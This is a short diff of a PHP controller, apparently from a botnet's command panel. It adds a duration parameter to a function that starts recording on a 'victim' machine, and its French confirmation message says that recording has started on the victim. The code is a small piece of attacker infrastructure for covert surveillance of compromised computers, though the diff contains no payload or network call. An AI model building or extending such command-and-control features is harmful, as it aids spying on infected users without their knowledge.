@@ -226,8 +226,9 @@ class VictimsController extends Controller
     {
         $victim_id = $request->victim_id;
         $victim_uid = $request->victim_uid;
+        $time = $request->time;
 
-        $record = (new BotnetController)->record($victim_uid);
+        $record = (new BotnetController)->record($victim_uid, $time);
 
         return redirect("/victims/$victim_id")->with('output', "Enregistrement lancé sur la victime.");
     }
